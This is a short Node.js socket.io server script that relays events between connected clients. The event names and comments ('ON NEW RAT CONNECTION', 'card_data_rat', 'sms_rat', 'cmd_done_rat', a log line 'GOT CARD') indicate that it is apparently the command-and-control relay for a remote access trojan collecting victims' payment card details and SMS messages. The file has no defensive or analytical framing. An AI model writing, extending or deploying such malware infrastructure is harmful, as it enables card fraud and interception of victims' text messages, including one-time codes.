var express = require('express');  
var app = express();  
var server = require('http').createServer(app);  
var io = require('socket.io')(server);
var CryptoJS = require("crypto-js");

const PORT = 8080;

//io.set('heartbeat interval', 10000);
//io.set('heartbeat timeout', 20000);

server.listen(process.env.PORT || 8080, function () {
  console.log(`Listening on ${ PORT }`);
  
  var intervalId = setInterval(function() {
		//console.log("Interval reached every 5s")
		io.emit('ping','ping');
	}, 5000);
});


io.on('connection', function(socket) {
	ServerSocket = socket;
	
	
	socket.on('online_check' , function(data){
		io.emit('is_online',data);
	});
	
	socket.on('online_check_card' , function(data){
		io.emit('are_you_online',data);
	});
		
	socket.on('user_send' , function(data){
		io.emit('user_online',data);
	});
		
	socket.on('msg_send' , function(data){
		io.emit('sms_got',data);
	});
	
	socket.on('card_send' , function(data){
		console.log("GOT CARD"+data);
		io.emit('card_got',data);
	});
	
	socket.on('send_card_copy' , function(data){
		io.emit('card_copy',data);
	});
	
	
	// ON NEW RAT CONNECTION AFTER NEW CONNECTION
	socket.on('user_connected' , function(data){
		io.emit('on_user_connected',data);
	});
	
	socket.on('card_data' , function(data){
		io.emit('card_data_rat',data);
	});

	socket.on('sms' , function(data){
		io.emit('sms_rat',data);
	});
	
		
	socket.on('cmd_done' , function(data){
		io.emit('cmd_done_rat',data);
	});

	
	socket.on("disconnect", () => console.log("User Disconnected: "+socket.id));

});
